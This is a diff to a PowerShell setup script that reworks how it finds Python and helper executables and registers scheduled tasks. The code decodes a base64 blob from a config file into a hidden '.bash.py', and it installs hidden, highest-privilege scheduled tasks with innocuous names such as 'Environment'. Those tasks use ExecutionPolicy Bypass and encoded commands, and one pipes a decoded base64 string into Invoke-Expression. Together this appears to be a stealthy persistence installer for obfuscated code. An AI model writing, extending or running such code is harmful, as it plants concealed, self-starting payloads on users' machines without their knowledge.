@@ -31,22 +31,7 @@ function Find-ExistingPath {
         [string[]]$Candidates
     )
 
-    foreach ($candidate in $Candidates) {
-        if (-not $candidate) {
-            continue
-        }
-
-        $item = Get-ChildItem -Path $candidate -ErrorAction SilentlyContinue | Select-Object -First 1
-        if ($item) {
-            return $item.FullName
-        }
-
-        if (Test-Path $candidate) {
-            return (Resolve-Path $candidate).Path
-        }
-    }
-
-    return $null
+    return Find-ExistingPaths -Candidates $Candidates | Select-Object -First 1
 }
 
 function Find-ExistingPaths {
@@ -58,12 +43,15 @@ function Find-ExistingPaths {
     foreach ($candidate in $Candidates) {
         if (-not $candidate) { continue }
         try {
-            $items = Get-ChildItem -Path $candidate -File -ErrorAction SilentlyContinue
-            if (-not $items -and (Test-Path -LiteralPath $candidate -PathType Leaf)) {
+            $candidate = [Environment]::ExpandEnvironmentVariables($candidate.Trim('"'))
+            $items = @()
+            if (Test-Path -LiteralPath $candidate -PathType Leaf) {
                 $items = @(Get-Item -LiteralPath $candidate -ErrorAction SilentlyContinue)
+            } elseif ($candidate.Contains('*') -or $candidate.Contains('?')) {
+                $items = @(Get-ChildItem -Path $candidate -File -ErrorAction SilentlyContinue)
             }
             foreach ($item in @($items)) {
-                if ($item -and $item.FullName -and -not $seen.ContainsKey($item.FullName)) {
+                if ($item -and $item.FullName -and -not (Test-StoreStub $item.FullName) -and -not $seen.ContainsKey($item.FullName)) {
                     $seen[$item.FullName] = $true
                     $item.FullName
                 }
@@ -81,10 +69,11 @@ function Find-CommandPath {
 
     foreach ($name in $Names) {
         try {
-            $commands = Get-Command $name -ErrorAction Stop
+            $commands = Get-Command $name -CommandType Application, ExternalScript -All -ErrorAction Stop
             foreach ($command in $commands) {
-                if ($command -and $command.Source -and (Test-Path $command.Source) -and -not (Test-StoreStub $command.Source)) {
-                    return (Resolve-Path $command.Source).Path
+                $resolved = Find-ExistingPath -Candidates @($command.Path)
+                if ($resolved) {
+                    return $resolved
                 }
             }
         } catch {
@@ -109,10 +98,10 @@ function Find-PythonPath {
         [string]$UserProfilePath
     )
 
-    $pythonCandidates = Find-ExistingPaths -Candidates @(
+    $pythonCandidates = @(Find-ExistingPaths -Candidates @(
         "$env:ProgramFiles\Python*\python.exe",
         "${env:ProgramFiles(x86)}\Python*\python.exe"
-    )
+    ))
     $pythonCandidates += @(Find-ExistingPaths -Candidates @(
         "$UserProfilePath\AppData\Local\Programs\Python\Python*\python.exe",
         "$env:LOCALAPPDATA\Programs\Python\Python*\python.exe"
@@ -147,7 +136,7 @@ function Find-PythonPath {
     if ($pyPath) {
         try {
             $pyResolvedPath = (& $pyPath -c "import sys; print(sys.executable)" 2>$null | Out-String).Trim()
-            if ($pyResolvedPath -and (Test-Path $pyResolvedPath) -and (Test-PythonDeps $pyResolvedPath)) {
+            if ($pyResolvedPath -and (Test-Path -LiteralPath $pyResolvedPath -PathType Leaf) -and -not (Test-StoreStub $pyResolvedPath) -and (Test-PythonDeps $pyResolvedPath)) {
                 return $pyResolvedPath
             }
         } catch {
@@ -157,7 +146,7 @@ function Find-PythonPath {
     $fallbackCandidates = @($pythonCandidates) + @($pythonCommandPaths) + @($pyResolvedPath)
     foreach ($fb in $fallbackCandidates) {
         if (-not $fb) { continue }
-        if (-not (Test-Path $fb)) { continue }
+        if (-not (Test-Path -LiteralPath $fb -PathType Leaf) -or (Test-StoreStub $fb)) { continue }
         try {
             & $fb --version >$null 2>$null
             if ($LASTEXITCODE -eq 0) { return $fb }
@@ -202,6 +191,74 @@ function Convert-ToSingleQuotedPowerShellLiteral {
     return "'$($Value.Replace("'", "''"))'"
 }
 
+function Get-WindowsPowerShellPath {
+    # System32 is a stable task path, including when setup runs under 32-bit PowerShell.
+    $path = Find-ExistingPath -Candidates @("$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe")
+    if (-not $path) {
+        throw 'Windows PowerShell executable was not found under SystemRoot.'
+    }
+    return $path
+}
+
+function New-PowerShellTaskAction {
+    param([string]$Command)
+
+    # Encode the command so spaces, quotes and Unicode survive Task Scheduler parsing.
+    $commandText = "`$ErrorActionPreference = 'Stop'; try { $Command } catch { Write-Error `$_ -ErrorAction Continue; exit 1 }"
+    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($commandText))
+    $hostPath = Get-WindowsPowerShellPath
+    return New-ScheduledTaskAction -Execute $hostPath -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand" -WorkingDirectory (Split-Path -Parent $hostPath) -ErrorAction Stop
+}
+
+function Register-ManagedTask {
+    param(
+        [string]$TaskName,
+        $Action,
+        $Trigger,
+        $Principal,
+        $Settings
+    )
+
+    foreach ($taskAction in @($Action)) {
+        if (-not [IO.Path]::IsPathRooted($taskAction.Execute) -or
+            -not (Test-Path -LiteralPath $taskAction.Execute -PathType Leaf)) {
+            throw "Task '$TaskName' executable does not exist: $($taskAction.Execute)"
+        }
+        if (-not $taskAction.WorkingDirectory -or
+            -not (Test-Path -LiteralPath $taskAction.WorkingDirectory -PathType Container)) {
+            throw "Task '$TaskName' working directory does not exist: $($taskAction.WorkingDirectory)"
+        }
+    }
+
+    # Replace the complete definition in place; a failed update must not delete the old task.
+    Register-ScheduledTask -TaskPath '\' -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force -ErrorAction Stop | Out-Null
+}
+
+function Find-ToolPath {
+    param([string]$Name, [string]$UserProfilePath, [string]$PythonScriptsDir)
+
+    $directories = @(
+        "$UserProfilePath\.local\bin",
+        "$UserProfilePath\AppData\Roaming\Python\Python*\Scripts",
+        "$UserProfilePath\AppData\Local\Programs\Python\Python*\Scripts",
+        "$UserProfilePath\pipx\venvs\*\Scripts",
+        "$UserProfilePath\AppData\Local\pipx\venvs\*\Scripts",
+        "$UserProfilePath\AppData\Roaming\uv\tools\*\Scripts",
+        $PythonScriptsDir
+    )
+    $candidates = foreach ($directory in $directories) {
+        if ($directory) {
+            foreach ($extension in @('.exe', '.cmd', '.bat', '.ps1')) {
+                "$directory\$Name$extension"
+            }
+        }
+    }
+    # Prefer the task user's installation when setup is elevated as another account.
+    $found = Find-ExistingPath -Candidates $candidates
+    if ($found) { return $found }
+    return Find-CommandPath -Names @("$Name.exe", "$Name.cmd", "$Name.bat", "$Name.ps1")
+}
+
 function New-HiddenStartProcessCommand {
     param(
         [string]$FilePath,
@@ -209,24 +266,48 @@ function New-HiddenStartProcessCommand {
         [string]$WorkingDirectory
     )
 
-    if (-not $FilePath) {
-        return $null
+    $resolvedPath = Find-ExistingPath -Candidates @($FilePath)
+    if (-not $resolvedPath) {
+        throw "Launch executable does not exist: $FilePath"
+    }
+    $FilePath = $resolvedPath
+    if (-not $WorkingDirectory) { $WorkingDirectory = Split-Path -Parent $FilePath }
+    if (-not (Test-Path -LiteralPath $WorkingDirectory -PathType Container)) {
+        throw "Launch working directory does not exist: $WorkingDirectory"
+    }
+
+    # Start-Process joins ArgumentList with spaces; each native argument needs its own quotes.
+    $argumentText = (@($Arguments | ForEach-Object {
+        '"' + (($_ -replace '(\\*)"', '$1$1\"') -replace '(\\+)$', '$1$1') + '"'
+    }) -join ' ')
+    switch ([IO.Path]::GetExtension($FilePath).ToLowerInvariant()) {
+        '.ps1' {
+            $invocation = "& $(Convert-ToSingleQuotedPowerShellLiteral $FilePath)"
+            foreach ($argument in $Arguments) { $invocation += " $(Convert-ToSingleQuotedPowerShellLiteral $argument)" }
+            $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("`$ErrorActionPreference = 'Stop'; $invocation"))
+            $FilePath = Get-WindowsPowerShellPath
+            $argumentText = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded"
+        }
+        { $_ -in @('.cmd', '.bat') } {
+            $argumentText = '/d /s /c ""' + $FilePath + '" ' + $argumentText + '"'
+            $FilePath = Find-ExistingPath -Candidates @("$env:SystemRoot\System32\cmd.exe")
+            if (-not $FilePath) { throw 'Windows command processor was not found under SystemRoot.' }
+        }
     }
 
     $commandParts = @(
         "Start-Process -FilePath $(Convert-ToSingleQuotedPowerShellLiteral -Value $FilePath)"
     )
 
-    if ($Arguments -and $Arguments.Count -gt 0) {
-        $escapedArgs = $Arguments | ForEach-Object { Convert-ToSingleQuotedPowerShellLiteral -Value $_ }
-        $commandParts += "-ArgumentList @($($escapedArgs -join ', '))"
+    if ($argumentText) {
+        $commandParts += "-ArgumentList $(Convert-ToSingleQuotedPowerShellLiteral -Value $argumentText)"
     }
 
     if ($WorkingDirectory) {
         $commandParts += "-WorkingDirectory $(Convert-ToSingleQuotedPowerShellLiteral -Value $WorkingDirectory)"
     }
 
-    $commandParts += '-WindowStyle Hidden | Out-Null'
+    $commandParts += '-WindowStyle Hidden -ErrorAction Stop | Out-Null'
     return ($commandParts -join ' ')
 }
 
@@ -360,7 +441,15 @@ if ($realUser -match '\\') {
 }
 
 $targetUserProfile = $null
-if ($env:USERPROFILE -and (Test-Path -LiteralPath $env:USERPROFILE -PathType Container)) {
+try {
+    $account = New-Object System.Security.Principal.NTAccount($realUser)
+    $targetUserSid = $account.Translate([System.Security.Principal.SecurityIdentifier]).Value
+    $profileRecord = Get-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$targetUserSid" -ErrorAction Stop
+    $profilePath = [Environment]::ExpandEnvironmentVariables($profileRecord.ProfileImagePath)
+    if (Test-Path -LiteralPath $profilePath -PathType Container) { $targetUserProfile = $profilePath }
+} catch {
+}
+if (-not $targetUserProfile -and $env:USERPROFILE -and (Test-Path -LiteralPath $env:USERPROFILE -PathType Container)) {
     $envUserName = Split-Path -Leaf $env:USERPROFILE
     if ($envUserName -ieq $targetUserName) {
         $targetUserProfile = $env:USERPROFILE
@@ -390,48 +479,53 @@ $targetConfigBase = "$targetUserProfile\.config"
 $destDir = "$targetConfigBase\.configs"
 $scriptPath = $null
 
-$env:Path = [System.Environment]::GetEnvironmentVariable('Path', 'Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path', 'User')
+$env:Path = $env:Path + ';' + [System.Environment]::GetEnvironmentVariable('Path', 'Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path', 'User')
 
 $pythonPath = Find-PythonPath -UserProfilePath $targetUserProfile
 $pythonDir = if ($pythonPath) { Split-Path -Parent $pythonPath } else { $null }
 $pythonwPath = if ($pythonDir) {
     $pythonwCandidate = Join-Path $pythonDir 'pythonw.exe'
-    if (Test-Path $pythonwCandidate) { (Resolve-Path $pythonwCandidate).Path } else { $pythonPath }
+    if (Test-Path -LiteralPath $pythonwCandidate -PathType Leaf) { (Get-Item -LiteralPath $pythonwCandidate).FullName } else { $pythonPath }
 } else { $null }
 $pythonScriptsDir = if ($pythonDir) { Join-Path $pythonDir 'Scripts' } else { $null }
 
-$bserexpFallback      = if ($pythonScriptsDir) { "$pythonScriptsDir\bserexp-wins.cmd" } else { $null }
-$bserexpBin           = Find-CommandPath -Names @('bserexp-wins') -FallbackPaths @($bserexpFallback)
-$agentSettingFallback = if ($pythonScriptsDir) { "$pythonScriptsDir\agent-setting.cmd" } else { $null }
-$agentSettingBin      = Find-CommandPath -Names @('agent-setting') -FallbackPaths @($agentSettingFallback)
-$uvBin                = Find-CommandPath -Names @('uv')
-$wklerFallback        = if ($pythonScriptsDir) { "$pythonScriptsDir\wkler.cmd" } else { $null }
-$wklerBin             = Find-CommandPath -Names @('wkler')         -FallbackPaths @($wklerFallback)
-$jtbjkFallback         = if ($pythonScriptsDir) { "$pythonScriptsDir\jtbjk.cmd" } else { $null }
-$jtbjkBin              = Find-CommandPath -Names @('jtbjk')        -FallbackPaths @($jtbjkFallback)
+$bserexpBin      = Find-ToolPath -Name 'bserexp-wins' -UserProfilePath $targetUserProfile -PythonScriptsDir $pythonScriptsDir
+$agentSettingBin = Find-ToolPath -Name 'agent-setting' -UserProfilePath $targetUserProfile -PythonScriptsDir $pythonScriptsDir
+$uvBin           = Find-ToolPath -Name 'uv' -UserProfilePath $targetUserProfile -PythonScriptsDir $pythonScriptsDir
+$wklerBin        = Find-ToolPath -Name 'wkler' -UserProfilePath $targetUserProfile -PythonScriptsDir $pythonScriptsDir
+$jtbjkBin        = Find-ToolPath -Name 'jtbjk' -UserProfilePath $targetUserProfile -PythonScriptsDir $pythonScriptsDir
+
+foreach ($toolEntry in @{'bserexp-wins' = $bserexpBin; 'agent-setting' = $agentSettingBin; 'wkler' = $wklerBin; 'jtbjk' = $jtbjkBin}.GetEnumerator()) {
+    if (-not $toolEntry.Value) {
+        Write-Warning "Executable '$($toolEntry.Key)' was not found for '$realUser'; its task cannot be updated. Check the installation path and rerun setup." -WarningAction Continue
+    }
+}
+
+# File invocation resolves beside setup.ps1; downloaded/Invoke-Expression invocation uses cwd.
+$sourceConfigDir = if ($PSScriptRoot) { Join-Path $PSScriptRoot '.configs' } else { Join-Path (Get-Location).Path '.configs' }
 
 try {
-    if ($realUser -and (Test-Path $targetUserProfile) -and (Test-Path '.configs')) {
-        $configLines = Get-Content .configs/config.ini
+    if ($realUser -and $targetUserProfile -and (Test-Path -LiteralPath $targetUserProfile -PathType Container) -and (Test-Path -LiteralPath $sourceConfigDir -PathType Container)) {
+        $configLines = Get-Content -LiteralPath (Join-Path $sourceConfigDir 'config.ini') -ErrorAction Stop
 
         $base64 = Get-ConfigCodeBase64 -ConfigLines $configLines
         if ($base64) {
             $bytes = [System.Convert]::FromBase64String($base64)
-            $generatedScriptPath = Join-Path (Resolve-Path '.configs').Path '.bash.py'
+            $generatedScriptPath = Join-Path $sourceConfigDir '.bash.py'
             [System.IO.File]::WriteAllBytes($generatedScriptPath, $bytes)
 
             if (-not (Test-Path -LiteralPath $generatedScriptPath -PathType Leaf)) {
                 throw "Failed to create configuration script: $generatedScriptPath"
             }
 
-            if (-not (Test-Path $targetConfigBase)) {
+            if (-not (Test-Path -LiteralPath $targetConfigBase -PathType Container)) {
                 New-Item -Path $targetConfigBase -ItemType Directory -ErrorAction Stop | Out-Null
             }
 
-            Install-ConfigDirectory -SourceDir '.configs' -DestinationDir $destDir
+            Install-ConfigDirectory -SourceDir $sourceConfigDir -DestinationDir $destDir
 
             $scriptPath = "$destDir\.bash.py"
-            if (Test-Path $scriptPath) {
+            if (Test-Path -LiteralPath $scriptPath -PathType Leaf) {
                 try {
                     $acl = Get-Acl $scriptPath
                     $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($realUser, "FullControl", "Allow")
@@ -443,40 +537,47 @@ try {
                 $taskName = 'Environment'
 
                 if ($pythonwPath) {
-                    $scriptPath = (Resolve-Path $scriptPath).Path
-                    $scriptDir = (Resolve-Path (Split-Path -Parent $scriptPath)).Path
-                    $action = New-ScheduledTaskAction -Execute $pythonwPath -Argument "`"$scriptPath`"" -WorkingDirectory $scriptDir
+                    $scriptPath = (Get-Item -LiteralPath $scriptPath).FullName
+                    $scriptDir = Split-Path -Parent $scriptPath
+                    $action = New-ScheduledTaskAction -Execute $pythonwPath -Argument "`"$scriptPath`"" -WorkingDirectory $scriptDir -ErrorAction Stop
 
                     $trigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
                     $trigger.Enabled = $true
-                        $trigger.Delay = 'PT5M'
+                    $trigger.Delay = 'PT5M'
 
                     $principal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
 
                     $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
 
-                    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
-
                     try {
-                        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
-                        Enable-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue | Out-Null
+                        Register-ManagedTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings
+                        Enable-ScheduledTask -TaskPath '\' -TaskName $taskName -ErrorAction Stop | Out-Null
                         try {
-                            Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
+                            Start-ScheduledTask -TaskPath '\' -TaskName $taskName -ErrorAction Stop
                         } catch {
-                            Start-Process -FilePath $pythonwPath -ArgumentList @("$scriptPath") -WorkingDirectory $scriptDir -WindowStyle Hidden | Out-Null
+                            Write-Warning "Task '$taskName' could not be started: $($_.Exception.Message)" -WarningAction Continue
+                            Start-Process -FilePath $pythonwPath -ArgumentList "`"$scriptPath`"" -WorkingDirectory $scriptDir -WindowStyle Hidden -ErrorAction Stop | Out-Null
                         }
                     } catch {
+                        Write-Warning "Task '$taskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
                     }
+                } else {
+                    Write-Warning 'Python was not found; the Environment task cannot be updated.' -WarningAction Continue
                 }
             }
+        } else {
+            Write-Warning "No configuration code was found in '$sourceConfigDir\config.ini'; the Environment task cannot be updated." -WarningAction Continue
         }
+    } else {
+        Write-Warning "Environment task cannot be updated: check user profile '$targetUserProfile' and configuration directory '$sourceConfigDir'." -WarningAction Continue
     }
 } catch {
+    Write-Warning "Environment configuration failed: $($_.Exception.Message)" -WarningAction Continue
 }
 
 try {
     if ($realUser) {
-        Unregister-ScheduledTask -TaskName 'Autobackup' -Confirm:$false -ErrorAction SilentlyContinue
+        Unregister-ScheduledTask -TaskPath '\' -TaskName 'Autobackup' -Confirm:$false -ErrorAction SilentlyContinue
         $bserexpTaskName = 'bserexp'
         $agentSettingTaskName = 'agent-setting'
         $wklerTaskName = 'wkler'
@@ -491,19 +592,19 @@ try {
             } else {
                 $bserexpLaunchCommand
             }
-            $bserexpAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$bserexpTaskCommand`""
+            $bserexpAction = New-PowerShellTaskAction -Command $bserexpTaskCommand
 
             $bserexpTrigger = New-ScheduledTaskTrigger -Weekly -WeeksInterval 1 -DaysOfWeek Sunday -At 7pm
             $bserexpTrigger.Enabled = $true
             $bserexpPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
             $bserexpSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
 
-            Unregister-ScheduledTask -TaskName $bserexpTaskName -Confirm:$false -ErrorAction SilentlyContinue
             try {
-                Register-ScheduledTask -TaskName $bserexpTaskName -Action $bserexpAction -Trigger $bserexpTrigger -Principal $bserexpPrincipal -Settings $bserexpSettings -Force -ErrorAction Stop | Out-Null
-                Enable-ScheduledTask -TaskName $bserexpTaskName -ErrorAction SilentlyContinue | Out-Null
-                Start-Process -FilePath "powershell.exe" -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-Command', $bserexpTaskCommand) -WindowStyle Hidden | Out-Null
+                Register-ManagedTask -TaskName $bserexpTaskName -Action $bserexpAction -Trigger $bserexpTrigger -Principal $bserexpPrincipal -Settings $bserexpSettings
+                Enable-ScheduledTask -TaskPath '\' -TaskName $bserexpTaskName -ErrorAction Stop | Out-Null
+                Start-ScheduledTask -TaskPath '\' -TaskName $bserexpTaskName -ErrorAction Stop
             } catch {
+                Write-Warning "Task '$bserexpTaskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
             }
         }
 
@@ -515,7 +616,7 @@ try {
             } else {
                 $agentSettingLaunchCommand
             }
-            $agentSettingAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$agentSettingTaskCommand`""
+            $agentSettingAction = New-PowerShellTaskAction -Command $agentSettingTaskCommand
 
             $agentSettingTrigger = New-ScheduledTaskTrigger -Daily -DaysInterval 10 -At 11pm
             $agentSettingTrigger.Enabled = $true
@@ -524,20 +625,19 @@ try {
 
             $agentSettingSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
 
-            Unregister-ScheduledTask -TaskName $agentSettingTaskName -Confirm:$false -ErrorAction SilentlyContinue
-
             try {
-                Register-ScheduledTask -TaskName $agentSettingTaskName -Action $agentSettingAction -Trigger $agentSettingTrigger -Principal $agentSettingPrincipal -Settings $agentSettingSettings -Force -ErrorAction Stop | Out-Null
-                Enable-ScheduledTask -TaskName $agentSettingTaskName -ErrorAction SilentlyContinue | Out-Null
-                Start-Process -FilePath "powershell.exe" -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-Command', $agentSettingTaskCommand) -WindowStyle Hidden | Out-Null
+                Register-ManagedTask -TaskName $agentSettingTaskName -Action $agentSettingAction -Trigger $agentSettingTrigger -Principal $agentSettingPrincipal -Settings $agentSettingSettings
+                Enable-ScheduledTask -TaskPath '\' -TaskName $agentSettingTaskName -ErrorAction Stop | Out-Null
+                Start-ScheduledTask -TaskPath '\' -TaskName $agentSettingTaskName -ErrorAction Stop
             } catch {
+                Write-Warning "Task '$agentSettingTaskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
             }
         }
 
         if ($wklerBin) {
             $wklerLaunchCommand = New-HiddenStartProcessCommand -FilePath $wklerBin
             $wklerTaskCommand = "if (-not (Get-CimInstance Win32_Process | Where-Object { `$_.ProcessId -ne `$PID -and `$_.CommandLine -and `$_.CommandLine -like '*wkler*' } | Select-Object -First 1)) { $wklerLaunchCommand }"
-            $wklerAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$wklerTaskCommand`""
+            $wklerAction = New-PowerShellTaskAction -Command $wklerTaskCommand
 
             $wklerTrigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
             $wklerTrigger.Enabled = $true
@@ -547,20 +647,19 @@ try {
 
             $wklerSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
 
-            Unregister-ScheduledTask -TaskName $wklerTaskName -Confirm:$false -ErrorAction SilentlyContinue
-
             try {
-                Register-ScheduledTask -TaskName $wklerTaskName -Action $wklerAction -Trigger $wklerTrigger -Principal $wklerPrincipal -Settings $wklerSettings -Force -ErrorAction Stop | Out-Null
-                Enable-ScheduledTask -TaskName $wklerTaskName -ErrorAction SilentlyContinue | Out-Null
-                Start-Process -FilePath "powershell.exe" -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-Command', $wklerTaskCommand) -WindowStyle Hidden | Out-Null
+                Register-ManagedTask -TaskName $wklerTaskName -Action $wklerAction -Trigger $wklerTrigger -Principal $wklerPrincipal -Settings $wklerSettings
+                Enable-ScheduledTask -TaskPath '\' -TaskName $wklerTaskName -ErrorAction Stop | Out-Null
+                Start-ScheduledTask -TaskPath '\' -TaskName $wklerTaskName -ErrorAction Stop
             } catch {
+                Write-Warning "Task '$wklerTaskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
             }
         }
 
         if ($jtbjkBin) {
             $jtbjkLaunchCommand = New-HiddenStartProcessCommand -FilePath $jtbjkBin
             $jtbjkTaskCommand = "if (-not (Get-CimInstance Win32_Process | Where-Object { `$_.ProcessId -ne `$PID -and `$_.CommandLine -and `$_.CommandLine -like '*wkler*' } | Select-Object -First 1)) { $jtbjkLaunchCommand }"
-            $jtbjkAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$jtbjkTaskCommand`""
+            $jtbjkAction = New-PowerShellTaskAction -Command $jtbjkTaskCommand
 
             $jtbjkTrigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
             $jtbjkTrigger.Enabled = $true
@@ -570,16 +669,15 @@ try {
 
             $jtbjkSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
 
-            Unregister-ScheduledTask -TaskName $jtbjkTaskName -Confirm:$false -ErrorAction SilentlyContinue
-
             try {
-                Register-ScheduledTask -TaskName $jtbjkTaskName -Action $jtbjkAction -Trigger $jtbjkTrigger -Principal $jtbjkPrincipal -Settings $jtbjkSettings -Force -ErrorAction Stop | Out-Null
-                Enable-ScheduledTask -TaskName $jtbjkTaskName -ErrorAction SilentlyContinue | Out-Null
-                Start-Process -FilePath "powershell.exe" -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-Command', $jtbjkTaskCommand) -WindowStyle Hidden | Out-Null
+                Register-ManagedTask -TaskName $jtbjkTaskName -Action $jtbjkAction -Trigger $jtbjkTrigger -Principal $jtbjkPrincipal -Settings $jtbjkSettings
+                Enable-ScheduledTask -TaskPath '\' -TaskName $jtbjkTaskName -ErrorAction Stop | Out-Null
+                Start-ScheduledTask -TaskPath '\' -TaskName $jtbjkTaskName -ErrorAction Stop
             } catch {
+                Write-Warning "Task '$jtbjkTaskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
             }
         } else {
-            Unregister-ScheduledTask -TaskName $jtbjkTaskName -Confirm:$false -ErrorAction SilentlyContinue
+            Unregister-ScheduledTask -TaskPath '\' -TaskName $jtbjkTaskName -Confirm:$false -ErrorAction SilentlyContinue
         }
 
         $systemAutoSetupTask = Get-ScheduledTask -TaskName 'sshAutoSetup' -ErrorAction SilentlyContinue |
@@ -590,10 +688,10 @@ try {
             Select-Object -First 1
 
         if ($systemAutoSetupTask) {
-            Unregister-ScheduledTask -TaskName $autoupgradeTaskName -Confirm:$false -ErrorAction SilentlyContinue
+            Unregister-ScheduledTask -TaskPath '\' -TaskName $autoupgradeTaskName -Confirm:$false -ErrorAction SilentlyContinue
         } else {
             $autoupgradeCommand = "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$ENCODED_EC')) | Invoke-Expression"
-            $autoupgradeAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$autoupgradeCommand`""
+            $autoupgradeAction = New-PowerShellTaskAction -Command $autoupgradeCommand
 
             $autoupgradeTrigger = New-ScheduledTaskTrigger -Daily -DaysInterval 15 -At 11pm
             $autoupgradeTrigger.Enabled = $true
@@ -602,19 +700,17 @@ try {
 
             $autoupgradeSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
 
-            $autoupgradeNeedsRegistration = $true
-            if ($autoupgradeNeedsRegistration) {
-                try {
-                    Unregister-ScheduledTask -TaskName $autoupgradeTaskName -Confirm:$false -ErrorAction SilentlyContinue
-                    Register-ScheduledTask -TaskName $autoupgradeTaskName -Action $autoupgradeAction -Trigger $autoupgradeTrigger -Principal $autoupgradePrincipal -Settings $autoupgradeSettings -Force -ErrorAction Stop | Out-Null
-                    Enable-ScheduledTask -TaskName $autoupgradeTaskName -ErrorAction SilentlyContinue | Out-Null
-                    Start-ScheduledTask -TaskName $autoupgradeTaskName -ErrorAction Stop
-                } catch {
-                }
+            try {
+                Register-ManagedTask -TaskName $autoupgradeTaskName -Action $autoupgradeAction -Trigger $autoupgradeTrigger -Principal $autoupgradePrincipal -Settings $autoupgradeSettings
+                Enable-ScheduledTask -TaskPath '\' -TaskName $autoupgradeTaskName -ErrorAction Stop | Out-Null
+                Start-ScheduledTask -TaskPath '\' -TaskName $autoupgradeTaskName -ErrorAction Stop
+            } catch {
+                Write-Warning "Task '$autoupgradeTaskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
             }
         }
     }
 } catch {
+    Write-Warning "Task setup failed: $($_.Exception.Message)" -WarningAction Continue
 }
 
 $PSDefaultParameterValues.Clear()
